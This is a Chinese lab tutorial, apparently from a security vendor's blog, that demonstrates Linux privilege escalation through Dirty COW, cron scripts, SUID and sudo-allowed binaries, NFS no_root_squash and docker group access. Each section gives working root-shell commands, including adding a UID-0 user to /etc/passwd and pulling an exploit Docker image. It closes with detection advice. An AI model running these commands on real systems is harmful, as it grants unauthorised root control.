阅读： 23

Linux对不同角色的用户进行了权限管控，提权意味着用户获得不允许他使用的权限。  比如可以通过提权将用户的角色由普通用户变为管理员，从而获得更高的访问权限，执行相应的高危操作。提权是渗透流程中非常重要的一环，很大程度上决定本次渗透的最终成果。Linux提权的常见手法有以下几种：内核漏洞提权、定时任务提权、SUID提权、SUDO滥用提权、NFS提权、Docker组提权，下面逐一介绍。

## **1.******内核漏洞提权****

Linux系统处于源码开放状态，多年来被各国的安全从业者发现一系列漏洞，利用其中的一部分漏洞可以直接获取到系统的最高权限。利用内核漏洞进行提权一般包括三个环节：首先，对目标系统进行信息收集，获取到系统内核信息以及版本信息；而后，根据内核版本获取其对应的漏洞以及EXP；最后，使用找到的EXP对目标系统发起攻击，完成提权操作。本文以一个经典的Linux内核提权漏洞-“Dirty COW”来做演示，其信息如下所示：

漏洞信息：CVE-2016-5195漏洞（Dirty COW，脏牛）

影响范围：Linux 内核2.6.22 – 3.9 (x86/x64)

漏洞EXP：[https://github.com/FireFart/dirtycow](https://github.com/FireFart/dirtycow)

该漏洞的利用方式如下：

（1）信息收集：通过“uname -a”命令查看内核版本，可见其存在本漏洞。

![](http://blog.nsfocus.net/wp-content/uploads/2022/08/1-3-300x25.png)

（2）获取EXP：通过上文的链接将exp下载到本地，使用“gcc -pthread dirty.c -o dirty -lcrypt”命令对dirty.c进行编译，生成一个名为dirty的可执行文件。此时查看用户信息，显示当前用户为普通用户。

![](http://blog.nsfocus.net/wp-content/uploads/2022/08/2-6-300x51.png)

（3）发起攻击：执行“./dirty  123456”（密码自定义），执行提权。

![](http://blog.nsfocus.net/wp-content/uploads/2022/08/3-5-300x160.png)

根据返回信息的提示，使用“firefart”进行登录，密码为上文设置的密码。查看用户权限，为root权限，提权成功！

![](http://blog.nsfocus.net/wp-content/uploads/2022/08/4-4-300x73.png)

## **2\.** ****定时任务提权****

定时任务（cron job）是Linux系统中的一个守护进程，用于调度重复任务，通过配置crontab可以让系统周期性地执行某些命令或者脚本。cron 是 Linux 系统中最为实用的工具之一，但是也可能被黑客用于提权操作。由于cron通常以root特权运行，如果我们可以修改其调度的任何脚本或二进制文件，那么便可以使用root权限执行任意代码。本文首先配置一个定时任务，然后利用该任务进行提权。

（1）定时任务创建

编写一个脚本test.py ，将其权限置为所有用户可读可写可操作：chmod 777 test.py。

![](http://blog.nsfocus.net/wp-content/uploads/2022/08/5-4-300x39.png)

而后修改crontab文件，将定时任务注册到系统中：vim /etc/crontab，在末尾加上“\*/1 \*   \* \* \*   root    python  /home/ubuntu/test.py”，表示每1分钟运行一次test.py。至此，定时任务创建成功。

![](http://blog.nsfocus.net/wp-content/uploads/2022/08/6-3-300x79.png)

（2）提权操作

假设通过之前的渗透操作，获得了低权限的用户ubuntu。

****![](http://blog.nsfocus.net/wp-content/uploads/2022/08/7-3-300x24.png)****

查看crontab文件：cat /etc/crontab，发现存在定时任务，以root身份定时运行/home/ubuntu/test.py。而test.py文件是任意成员可写的，于是向其代码尾部追加以下内容：

“os.chmod(“/etc/passwd”,stat.S\_IRWXU|stat.S\_IRWXG|stat.S\_IRWXO)”，将passwd文件权限设置为任意成员可写。

![](http://blog.nsfocus.net/wp-content/uploads/2022/08/8-3-300x68.png)

一分钟之后，程序自动运行，发现passwd已经任意成员可写。

![](http://blog.nsfocus.net/wp-content/uploads/2022/08/9-3-300x30.png)

接下来需要做的就是构造一个用户，在密码占位符处指定密码，UID设置为0，并将其添加到 /etc/passwd 文件中。

首先，使用perl语言生成带有盐值的密码： perl -le ‘print crypt(“hack”,“addedsalt”)’

![](http://blog.nsfocus.net/wp-content/uploads/2022/08/10-3-300x18.png)

而后，拼接密码，将以下字符串写入/etc/passwd文件，之后便拥有了一个超级用户hack：hack。

“hack:adCP9//qaScc2:0:0:User\_like\_root:/root:/bin/bash”

![](http://blog.nsfocus.net/wp-content/uploads/2022/08/11-3-300x48.png)

最后，登录hack用户，自动跳转到root用户，提权成功！

![](http://blog.nsfocus.net/wp-content/uploads/2022/08/12-3-300x66.png)

## **3\.**  ****SUID提权****

SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。为可执行文件添加suid权限的目的是简化操作流程，让普通用户也能做一些高权限才能做的的工作。但是如果某些现有的二进制文件和实用程序具有SUID权限的话，就可以在执行时将权限提升为root。

SUID提权的原理与Linux进程的UID有关，进程在运行的时候有以下三个UID：

（A）Real UID：执行该进程的用户的UID。Real UID只用于标识用户，不用于权限检查。

（B）Effective UID（EUID）：进程执行时生效的UID。在对访问目标进行操作时，系统会检查EUID是否有权限。一般情况下，Real UID与EUID相同，但在运行设置了SUID权限的程序时，进程的EUID会被设置为程序文件属主的UID。

（C）Saved UID：在高权限用户降权后，保留的UID。

如果某个设置了SUID权限的程序运行后创建了shell，那么shell进程的EUID也会是这个程序文件属主的UID，如果属主为root，便是一个root shell。root shell中运行的程序的EUID也都是0，具备超级权限，于是便实现了提权。本文中先为进程配置权限，而后实现提权操作。

-   权限配置

使用“chmod  u+s  progress\_test”命令为文件配置SUID权限，本文以find、make、flock、env、python为例，配置成功之后拥有者权限的执行位为s。

![](http://blog.nsfocus.net/wp-content/uploads/2022/08/13-3-300x90.png)

-   提权操作

假设前期的渗透操作已经拿下了一个低权限的用户suid\_test,下面对其提权。使用命令查看本机中拥有suid权限的程序文件：find / -user root -perm -4000 -print 2>/dev/null

![](http://blog.nsfocus.net/wp-content/uploads/2022/08/14-2-300x159.png)

1) find

输入以下命令：find . -exec /bin/sh -p \\; -quit，返回shell，可见该进程euid为root，可以读取shadow文件，提权成功！

![](http://blog.nsfocus.net/wp-content/uploads/2022/08/15-1-300x53.png)

2) make

输入以下命令返回root shell：

COMMAND=’/bin/sh -p’

make -s –eval=$’x:\\n\\t-‘”$COMMAND”

![](http://blog.nsfocus.net/wp-content/uploads/2022/08/16-1-300x44.png)

3) flock

输入以下命令返回root shell：

flock -u / /bin/sh -p

****![](http://blog.nsfocus.net/wp-content/uploads/2022/08/17-1-300x55.png)****

4) env

输入以下命令返回root shell：

env /bin/sh -p

****![](http://blog.nsfocus.net/wp-content/uploads/2022/08/18-300x36.png)****

5) python

输入以下命令返回root shell：

python -c ‘import os; os.execl(“/bin/sh”, “sh”, “-p”)’

![](http://blog.nsfocus.net/wp-content/uploads/2022/08/19-300x19.png)

## ****4\. Sud********o滥用提权****

sudo是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的一个工具，如halt，reboot，su等等。sudo使一般用户不需要知道超级用户的密码即可获得权限。首先超级用户将普通用户的名字、可以执行的特定命令、按照哪种用户或用户组的身份执行等信息，登记在特殊的文件中（通常是/etc/sudoers），即完成对该用户的授权（此时该用户称为“sudoer”）；在一般用户需要取得特殊权限时，其可在命令前加上“sudo”，此时sudo将会询问该用户自己的密码（以确认终端机前的是该用户本人），回答后系统即会将该命令的进程以超级用户的权限运行。之后的一段时间内（默认为5分钟，可在/etc/sudoers自定义），使用sudo不需要再次输入密码。

在sudoers中增加以下内容，可以使用户user\_test可以从任何终端运行，以root用户身份运行命令find 而无需密码。

user\_test  ALL = (root) NOPASSWD: /usr/bin/find

-   权限配置

新建普通用户sudo\_test，而后切换到root用户，执行以下动作：

添加文件的写权限：chmod u+w /etc/sudoers；

向sudoer文件中添加以下内容（可按需增加）：sudo\_test   ALL= (root) NOPASSWD: /usr/bin/find, (root) NOPASSWD: /usr/bin/vim,(root) NOPASSWD:/usr/bin/awk,(root) NOPASSWD:/usr/bin/man,(root) NOPASSWD:/usr/bin/less,(root) NOPASSWD:/bin/more,(root) NOPASSWD:/bin/tar,(root) NOPASSWD:/usr/bin/zip；

撤销文件的写权限：chmod u-w /etc/sudoers；

![](http://blog.nsfocus.net/wp-content/uploads/2022/08/20-300x24.png)

-   提权操作

当前已经获取到低权限用户sudo\_test，使用sudo -l命令查看本用户允许使用的sudo程序。

![](http://blog.nsfocus.net/wp-content/uploads/2022/08/21-300x121.png)

1) find

执行以下命令：sudo find /etc/passwd -exec /bin/sh \\;，返回了root shell，提权成功！

![](http://blog.nsfocus.net/wp-content/uploads/2022/08/22-300x42.png)

2) Vim

执行以下命令提权：sudo vim -c ‘!sh’

![](http://blog.nsfocus.net/wp-content/uploads/2022/08/23-300x133.png)

3) awk

执行以下命令提权：sudo awk ‘BEGIN {system(“/bin/bash”)}’

![](http://blog.nsfocus.net/wp-content/uploads/2022/08/24-300x30.png)

4) Less

执行以下命令：sudo less /etc/hosts，之后输入！和enter，切换到root用户，提权成功！

![](http://blog.nsfocus.net/wp-content/uploads/2022/08/25-300x27.png)

5) Man

执行以下命令：sudo man man，之后输入！和enter，切换到root用户，提权成功！

![](http://blog.nsfocus.net/wp-content/uploads/2022/08/26-300x29.png)

## ****5\. NFS提权****

[NFS](https://so.csdn.net/so/search?q=NFS&spm=1001.2101.3001.7020)（网络文件系统）是一种分布式文件系统协议，NFS允许系统通过网络与其他人共享目录和文件。在NFS文件共享中，用户甚至程序可以访问远程系统上的信息，就像它们驻留在本地计算机上一样。NFS中的Root Squashing（root\_sqaush）参数阻止对连接到NFS卷的远程root用户具有root访问权限。当该参数设置为no\_root\_squash时，登入 NFS 主机使用分享目录的使用者如果是 root 的话，那么对于这个分享的目录来说，他就具有 root 的权限，基于此原理便可实现提权。

-   权限配置

首先在靶机（192.168.88.134）上配置NFS服务端，配置流程参考下面链接：

[https://blog.csdn.net/weicao1990/article/details/90137680](https://blog.csdn.net/weicao1990/article/details/90137680)

配置成功之后将/home/ubuntu/tmp文件夹设置为可远程访问，且 Root Squashing参数设置为no\_root\_squash。

![](http://blog.nsfocus.net/wp-content/uploads/2022/08/27-300x88.png)

-   提权操作

现在，我们拿到了一个低权限的shell nfs\_test，查看“/etc /exports”文件发现/home/ubuntu/tmp文件是可共享的，远程可以挂载，且为no\_root\_squash，于是可以利用该共享文件夹进行提权。

首先在攻击机（kali）上安装nfs客户端：sudo apt-get install nfs-common，然后将靶机的共享目录挂载到本机目录/home/kali/Desktop/test：sudo mount 192.168.88.134:/home/ubuntu/tmp  /home/kali/Desktop/test

![](http://blog.nsfocus.net/wp-content/uploads/2022/08/28-300x94.png)

在/home/kali/Desktop/test文件中写入一个C文件：

![](http://blog.nsfocus.net/wp-content/uploads/2022/08/%E5%9B%BE%E7%89%8717-1-300x60.png)

之后编译生成可执行exp，并赋予SUID权限：

gcc exp.c -o exp

chmod +s exp

![](http://blog.nsfocus.net/wp-content/uploads/2022/08/29-300x139.png)

之后回到靶机，可见靶机上文件与攻击机上一致，执行exp，用户切换到root，提权成功！

****![](http://blog.nsfocus.net/wp-content/uploads/2022/08/30-300x66.png)****

## **6\.** ****Docker提权****

除了利用Linux系统自带的工具进行提权，还可以利用大量存在风险的第三方工具进行提权，本文以Docker为例进行演示。 随着云化时代的来临，docker也越来越流行，在很多公司内部的linux机器上docker已然成了标配。Docker使用便捷，有以下几个特性：

（1）可免sudo使用docker：默认情况下使用docker必须要有sudo权限，对于一台机器多用户使用，往往很多用户只有普通权限。为了让普通用户也可以使用Docker，管理员将需要使用docker的用户添加到docker用户组(安装docker后默认会创建该组)中，用户重新登录机器即可免sudo使用docker了。

（2）容器内用户权限不受限：用户创建一个docker容器后，容器内默认是root账户，在不需要加sudo的情况下可以任意更改容器内的配置。正常情况下，这种模式既可以保证一台机器被很多普通用户使用，通过docker容器的隔离，相互之前互不影响；也给用户在容器内开放了充足的权限保证用户可以正常安装软件，修改容器配置等操作。

（3）容器内外文件可映射：docker提供了一个-v选项，提供用户将容器外的host目录映射进容器内，方便的进行容器内外的文件共享。

结合上面三个特点，可以实现用户提权操作。

-   用户配置

使用管理员新建一个普通用户user\_docker，并将其添加到docker组中：sudo gpasswd -a user\_docker docker。

![](http://blog.nsfocus.net/wp-content/uploads/2022/08/31-300x19.png)

![](http://blog.nsfocus.net/wp-content/uploads/2022/08/32-300x39.png)

-   提权操作

通过前期的渗透操作，拿下user\_docker的权限，下面对其进行提权。首先，运行一个容器：docker run -it -v /etc:/etc ubuntu /bin/bash，将宿主机的/etc目录直接映射进容器，从而覆盖了容器内的/etc目录。由于linux系统上的本地用户信息主要记录在/etc/目录下，比如两个常见文件/etc/passwd和/etc/group，而在容器内当前用户有root权限，于是可以随意修改这两个文件，实现提权：

修改/etc/passwd文件，可更改root密码，或者新增一个uid=0的用户。

修改/etc/group文件，将当前用户添加到sudo组中。

本文演示第二种方法，在容器内执行下列命令：usermod -aG sudo user\_docker，将user\_docker用户加载到sudo组中，而后退出容器。

![](http://blog.nsfocus.net/wp-content/uploads/2022/08/33-300x84.png)

查看宿主机文件/etc/group，可见user\_docker已经拥有sudo权限，提权成功！

![](http://blog.nsfocus.net/wp-content/uploads/2022/08/34-300x186.png)

除此之外，DockerHub上已经有人将exp打包成镜像rootplease ，只要用户在 docker 组中，运行下面命令就能直接在 docker 中获取到 root 权限:docker run -v /:/hostOS -it chrisfosterelli/rootplease。容器生成后自动获取到宿主机的 root 权限，并启动 shell 程序，直接在 docker 中执行命令。

![](http://blog.nsfocus.net/wp-content/uploads/2022/08/35-300x21.png)

在这种多用户借助docker共用一台机器的情况下，普通用户可以轻松的借助docker提升为sudo用户，从而可以进行任意修改系统配置等各种恶意操作。以上是本地用户的破坏还不是很明显，毕竟是公司内部用户大多不会进行恶意操作。然而，很多情况下普通用户为了方便，用户密码往往设置得很简单，如果攻击者通过其他途径暴力破解普通用户弱口令，就可以很轻松得提示为管理员从事不可限制的恶意操作，这也大大降低了攻击者的攻击难度。

## **7.** ****总结****

在渗透项目中，攻击人员通常会设法获取root权限的shell，然后再进行下一步的操作，本文旨在提供一些从普通权限到root权限的方法，总结如下：

（1）通过查看内核版本，寻找是否存在可以用于提权的漏洞。

（2）通过信息收集，查看定时任务，sudo配置，suid权限配置，查看是否存在可以用于提权的不当配置。

（3）通过查看第三方应用的配置信息或者其开放的服务，分析是否可以用于提权。

提权的手法多种多样，而作为安全从业者，除了需要知道如何进攻，更重要的是知道如何防守。关于提权的检测方法，提供以下几种思路：

-   内核漏洞检测：通过漏洞扫描工具发现存在的提权漏洞，在黑客发起攻击前修复漏洞，防患于未然。
-   配置合规检测：大量的提权漏洞是由于管理员的错误配置导致的，可以通过检测系统中的各种配置文件提前识别风险。
-   恶意命令检测：攻击者在提权过程中会使用一些恶意的命令，可以将常用的提权命令加入黑名单，若触发黑名单则认为存在提权。
-   进程调用信息检测：提权的最终特征是低权限的进程拉起了一个高权限的进程，基于此特征可以动态监控新建的进程，若满足条件则认为存在提权行为。

****参考链接：****

[https://www.freebuf.com/articles/web/254452.html](https://www.freebuf.com/articles/web/254452.html)

[https://xz.aliyun.com/t/2401#toc-0](https://xz.aliyun.com/t/2401#toc-0)

[https://cloud.tencent.com/developer/article/1708369](https://cloud.tencent.com/developer/article/1708369)

[https://www.freebuf.com/articles/web/280398.html](https://www.freebuf.com/articles/web/280398.html)

[https://blog.csdn.net/weicao1990/article/details/90137680](https://blog.csdn.net/weicao1990/article/details/90137680)

[https://szukevin.site/2020/05/31/%E5%88%A9%E7%94%A8docker%E6%8F%90%E6%9D%83%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95/](https://szukevin.site/2020/05/31/%E5%88%A9%E7%94%A8docker%E6%8F%90%E6%9D%83%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95/)

[https://www.freebuf.com/articles/network/268221.html](https://www.freebuf.com/articles/network/268221.html)

**版权声明**  
本站“技术博客”所有内容的版权持有者为绿盟科技集团股份有限公司（“绿盟科技”）。作为分享技术资讯的平台，绿盟科技期待与广大用户互动交流，并欢迎在标明出处（绿盟科技-技术博客）及网址的情形下，全文转发。  
上述情形之外的任何使用形式，均需提前向绿盟科技（010-68438880-5462）申请版权授权。如擅自使用，绿盟科技保留追责权利。同时，如因擅自使用博客内容引发法律纠纷，由使用者自行承担全部法律责任，与绿盟科技无关。